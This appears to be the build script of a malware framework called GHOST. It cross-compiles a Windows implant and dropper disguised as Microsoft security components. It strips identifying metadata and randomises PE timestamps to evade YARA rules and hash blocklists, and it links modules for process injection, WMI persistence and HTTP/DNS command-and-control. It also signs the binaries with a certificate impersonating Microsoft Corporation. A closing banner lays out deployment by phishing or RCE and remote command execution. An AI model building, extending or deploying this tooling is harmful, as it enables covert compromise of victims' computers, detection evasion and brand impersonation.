#!/usr/bin/env bash
# ─────────────────────────────────────────────────────────────────────────────
#  GHOST build script — cross-compile for Windows x64 via MinGW-w64 on Linux.
#
#  Outputs
#    build/WindowsSecurityUpdate.exe   — stage-2 implant
#    build/WinSecHealthSvc.exe         — stage-1 launcher / dropper
#
#  Usage
#    ./build.sh                — release (strip, O2, no debug symbols)
#    ./build.sh --debug        — debug symbols, no strip, -DDEBUG
#    ./build.sh --sign         — sign after build (needs certs/sign.pfx)
#    ./build.sh --setup        — install MinGW-w64 + optional tools
#    ./build.sh --clean        — remove build/ directory
#
#  One-time setup
#    sudo ./build.sh --setup && chmod +x build.sh
#
#  Cross-compile from WSL
#    wsl bash build.sh
# ─────────────────────────────────────────────────────────────────────────────
set -euo pipefail

# ── Toolchain ─────────────────────────────────────────────────────────────────
CXX="x86_64-w64-mingw32-g++"
WINDRES="x86_64-w64-mingw32-windres"
STRIP_TOOL="x86_64-w64-mingw32-strip"

# ── Final output filenames ────────────────────────────────────────────────────
IMPLANT_OUT="WindowsSecurityUpdate.exe"
LAUNCHER_OUT="WinSecHealthSvc.exe"

OUT_DIR="build"

# ─────────────────────────────────────────────────────────────────────────────
#  --setup: install toolchain and signing tools
# ─────────────────────────────────────────────────────────────────────────────
if [[ "${1:-}" == "--setup" ]]; then
    echo "[*] Installing MinGW-w64 cross-compilation toolchain…"
    if command -v apt-get &>/dev/null; then
        sudo apt-get update -qq
        sudo apt-get install -y \
            mingw-w64 \
            binutils-mingw-w64-x86-64 \
            python3 \
            osslsigncode 2>/dev/null || true
    elif command -v dnf &>/dev/null; then
        sudo dnf install -y mingw64-gcc-c++ python3 osslsigncode 2>/dev/null || true
    elif command -v pacman &>/dev/null; then
        sudo pacman -S --noconfirm mingw-w64-gcc python3 osslsigncode 2>/dev/null || true
    else
        echo "[!] Unknown package manager — install mingw-w64 manually."
        exit 1
    fi
    echo "[+] Setup complete. Run './build.sh' to compile."
    exit 0
fi

# ─────────────────────────────────────────────────────────────────────────────
#  --clean
# ─────────────────────────────────────────────────────────────────────────────
if [[ "${1:-}" == "--clean" ]]; then
    rm -rf "$OUT_DIR"
    echo "[+] Cleaned."
    exit 0
fi

# ─────────────────────────────────────────────────────────────────────────────
#  Verify toolchain present
# ─────────────────────────────────────────────────────────────────────────────
if ! command -v "$CXX" &>/dev/null; then
    echo "[!] $CXX not found. Run: sudo ./build.sh --setup"
    exit 1
fi
echo "[*] Toolchain: $($CXX --version | head -1)"

# ─────────────────────────────────────────────────────────────────────────────
#  Parse flags
# ─────────────────────────────────────────────────────────────────────────────
DEBUG=0
SIGN=0

for arg in "$@"; do
    case "$arg" in
        --debug) DEBUG=1 ;;
        --sign)  SIGN=1  ;;
    esac
done

mkdir -p "$OUT_DIR"

# ─────────────────────────────────────────────────────────────────────────────
#  Shared compiler flags
#
#  -fno-rtti                  no type_info symbols visible to strings(1)
#  -ffunction-sections        dead-code elimination per function
#  -fdata-sections            dead-code elimination per data object
#  -Wl,--gc-sections          discard unreferenced sections at link time
#  -Wl,--nxcompat             PE NXCOMPAT flag (DEP)
#  -Wl,--dynamicbase          PE DYNAMICBASE flag (ASLR)
#  -Wl,--high-entropy-va      64-bit ASLR address space entropy
#  -D_WIN32_WINNT=0x0A00      Windows 10+ APIs
# ─────────────────────────────────────────────────────────────────────────────
COMMON_FLAGS=(
    -std=c++17
    -DUNICODE -D_UNICODE
    -D_WIN32_WINNT=0x0A00
    -DNTDDI_VERSION=0x0A000008
    -mwindows
    -static -static-libgcc -static-libstdc++
    -fno-rtti
    -ffunction-sections
    -fdata-sections
    -fstack-protector-strong
    -I include
    -Wall -Wextra
    -Wno-unused-parameter
    -Wno-cast-function-type
    -Wno-missing-field-initializers
    -Wl,--gc-sections
    -Wl,--nxcompat
    -Wl,--dynamicbase
    -Wl,--high-entropy-va
)

if [[ $DEBUG -eq 1 ]]; then
    OPT_FLAGS=(-O0 -g3 -DDEBUG -DGHOST_DEBUG)
    DO_STRIP=0
    echo "[*] Mode: DEBUG"
else
    OPT_FLAGS=(-O2 -D_FORTIFY_SOURCE=2)
    DO_STRIP=1
    echo "[*] Mode: RELEASE"
fi

# ─────────────────────────────────────────────────────────────────────────────
#  randomise_pe_timestamp <binary>
#
#  Overwrites the COFF TimeDateStamp (PE offset +8) with a random value in the
#  plausible range 2018-01-01 → 2024-12-31.  Defeats binary-hash blocklists
#  that key off timestamp — identical source builds produce different hashes.
# ─────────────────────────────────────────────────────────────────────────────
randomise_pe_timestamp() {
    local binary="$1"
    python3 - "$binary" <<'PYEOF' 2>/dev/null || echo "[-] python3 unavailable — timestamp not randomised"
import sys, struct, random
path = sys.argv[1]
with open(path, 'r+b') as f:
    data = bytearray(f.read())
pe_off = struct.unpack_from('<I', data, 0x3C)[0]
if data[pe_off:pe_off+4] != b'PE\x00\x00':
    sys.exit(0)
ts_off = pe_off + 8          # COFF TimeDateStamp
rand_ts = random.randint(1514764800, 1735603200)   # 2018-01-01 → 2024-12-31
struct.pack_into('<I', data, ts_off, rand_ts)
with open(path, 'wb') as f:
    f.write(data)
print(f'[*] PE timestamp → 0x{rand_ts:08X}')
PYEOF
}

# ─────────────────────────────────────────────────────────────────────────────
#  strip_binary <binary>
#
#  Removes debug symbols, .comment (MinGW build strings), and GNU notes.
#  .comment in particular leaks the exact compiler version and is a trivial
#  YARA hit point.
# ─────────────────────────────────────────────────────────────────────────────
strip_binary() {
    local binary="$1"
    "$STRIP_TOOL" \
        --strip-all \
        --remove-section=.comment \
        --remove-section=.note \
        --remove-section=.note.gnu.build-id \
        "$binary"
}

# ─────────────────────────────────────────────────────────────────────────────
#  Build: WindowsSecurityUpdate.exe  (stage-2 implant)
#
#  Required libraries — none can be trimmed:
#    ntdll      NtDelayExecution + NT native syscall stubs (syscalls.cpp)
#    user32     SetErrorMode, GetTickCount64, window/message API
#    advapi32   Registry, token query (OpenProcessToken, GetTokenInformation)
#    ole32      COM runtime for WMI persistence (CoInitialize, CoCreateInstance)
#    oleaut32   BSTR/VARIANT helpers used by WMI (_bstr_t, _variant_t)
#    wbemuuid   WMI IWbemLocator / IWbemServices interface GUIDs
#    bcrypt     AES-256-GCM, SHA-256, BCryptGenRandom (utils.cpp)
#    winhttp    WinHttpOpen/Connect/SendRequest (c2.cpp)
#    dnsapi     DnsQuery_W — DNS TXT C2 fallback (c2.cpp)
# ─────────────────────────────────────────────────────────────────────────────
echo ""
echo "[*] Resources: ghost.rc → $OUT_DIR/ghost.res"
"$WINDRES" resources/ghost.rc -O coff -o "$OUT_DIR/ghost.res"

echo "[*] Compiling $IMPLANT_OUT …"
"$CXX" "${COMMON_FLAGS[@]}" "${OPT_FLAGS[@]}" \
    src/main.cpp         \
    src/syscalls.cpp     \
    src/evasion.cpp      \
    src/injection.cpp    \
    src/persistence.cpp  \
    src/c2.cpp           \
    src/utils.cpp        \
    "$OUT_DIR/ghost.res" \
    -lntdll              \
    -luser32             \
    -ladvapi32           \
    -lole32              \
    -loleaut32           \
    -lwbemuuid           \
    -lbcrypt             \
    -lwinhttp            \
    -ldnsapi             \
    -o "$OUT_DIR/$IMPLANT_OUT"

if [[ $DO_STRIP -eq 1 ]]; then
    echo "[*] Stripping $IMPLANT_OUT …"
    strip_binary "$OUT_DIR/$IMPLANT_OUT"
    randomise_pe_timestamp "$OUT_DIR/$IMPLANT_OUT"
fi

SZ_IMPLANT=$(du -sh "$OUT_DIR/$IMPLANT_OUT" | cut -f1)
echo "[+] $IMPLANT_OUT  $SZ_IMPLANT"

# ─────────────────────────────────────────────────────────────────────────────
#  Build: WinSecHealthSvc.exe  (stage-1 launcher / dropper)
#
#  Libraries:
#    user32    message-only window, tray API (Shell_NotifyIcon)
#    shell32   SHGetFolderPath (AppData path resolution)
#    winhttp   payload download from Worker /payload
# ─────────────────────────────────────────────────────────────────────────────
echo ""
echo "[*] Resources: launcher.rc → $OUT_DIR/launcher.res"
"$WINDRES" resources/launcher.rc -O coff -o "$OUT_DIR/launcher.res"

echo "[*] Compiling $LAUNCHER_OUT …"
"$CXX" "${COMMON_FLAGS[@]}" "${OPT_FLAGS[@]}" \
    src/launcher.cpp        \
    "$OUT_DIR/launcher.res" \
    -luser32                \
    -lshell32               \
    -lwinhttp               \
    -o "$OUT_DIR/$LAUNCHER_OUT"

if [[ $DO_STRIP -eq 1 ]]; then
    echo "[*] Stripping $LAUNCHER_OUT …"
    strip_binary "$OUT_DIR/$LAUNCHER_OUT"
    randomise_pe_timestamp "$OUT_DIR/$LAUNCHER_OUT"
fi

SZ_LAUNCHER=$(du -sh "$OUT_DIR/$LAUNCHER_OUT" | cut -f1)
echo "[+] $LAUNCHER_OUT  $SZ_LAUNCHER"

# ─────────────────────────────────────────────────────────────────────────────
#  Optional: code signing via osslsigncode
#
#  Prerequisite — generate a self-signed certificate for testing:
#
#    mkdir -p certs
#    openssl req -x509 -newkey rsa:4096 -keyout certs/sign.key \
#        -out certs/sign.crt -days 3650 -nodes \
#        -subj "/C=US/ST=WA/L=Redmond/O=Microsoft Corporation/CN=Microsoft Windows"
#    openssl pkcs12 -export -out certs/sign.pfx \
#        -inkey certs/sign.key -in certs/sign.crt \
#        -passout pass:ghost
#    echo ghost > certs/sign.pass
#
#  For real engagements: use a purchased EV code-signing cert (DigiCert / Sectigo).
#  Place the PFX at certs/sign.pfx and passphrase in certs/sign.pass.
#  Both paths are gitignored.
# ─────────────────────────────────────────────────────────────────────────────
if [[ $SIGN -eq 1 ]]; then
    if ! command -v osslsigncode &>/dev/null; then
        echo "[-] osslsigncode not installed — skipping signing"
        echo "    sudo apt-get install osslsigncode"
    elif [[ ! -f "certs/sign.pfx" ]]; then
        echo "[-] certs/sign.pfx not found — skipping signing"
        echo "    See build.sh header for generation instructions."
    else
        SIGN_PASS="${SIGN_PASS:-$(cat certs/sign.pass 2>/dev/null || echo '')}"

        for BIN in "$IMPLANT_OUT" "$LAUNCHER_OUT"; do
            SRC="$OUT_DIR/$BIN"
            TMP="$OUT_DIR/${BIN%.exe}_signed.exe"
            echo "[*] Signing $BIN …"
            if osslsigncode sign \
                -pkcs12 "certs/sign.pfx" \
                -pass   "$SIGN_PASS"     \
                -n      "Windows Security Update" \
                -i      "https://www.microsoft.com/" \
                -t      "http://timestamp.digicert.com" \
                -in     "$SRC"           \
                -out    "$TMP"           2>/dev/null
            then
                mv "$TMP" "$SRC"
                echo "[+] Signed: $BIN"
            else
                rm -f "$TMP"
                echo "[-] Signing failed for $BIN (cert may not be trusted)"
            fi
        done
    fi
fi

# ─────────────────────────────────────────────────────────────────────────────
#  Deployment summary
# ─────────────────────────────────────────────────────────────────────────────
echo ""
echo "╔══════════════════════════════════════════════════════════════════╗"
echo "║  GHOST — BUILD COMPLETE                                          ║"
echo "╠══════════════════════════════════════════════════════════════════╣"
printf "║  %-30s  %s\n" "$IMPLANT_OUT"  "$SZ_IMPLANT  ║"
printf "║  %-30s  %s\n" "$LAUNCHER_OUT" "$SZ_LAUNCHER  ║"
echo "╠══════════════════════════════════════════════════════════════════╣"
echo "║  DEPLOYMENT STEPS                                                ║"
echo "║                                                                  ║"
echo "║  1. Upload implant payload to Worker KV:                         ║"
printf "║     python server/c2_cli.py payload upload build/%s\n" "$IMPLANT_OUT"
echo "║                                                                  ║"
echo "║  2. Deliver WinSecHealthSvc.exe to target (phishing / RCE).      ║"
echo "║     It downloads + drops WindowsSecurityUpdate.exe automatically.║"
echo "║                                                                  ║"
echo "║  3. Monitor sessions:                                            ║"
echo "║     python server/c2_cli.py watch                                ║"
echo "║                                                                  ║"
echo "║  4. Run commands:                                                ║"
echo "║     python server/c2_cli.py console                              ║"
echo "╚══════════════════════════════════════════════════════════════════╝"
echo ""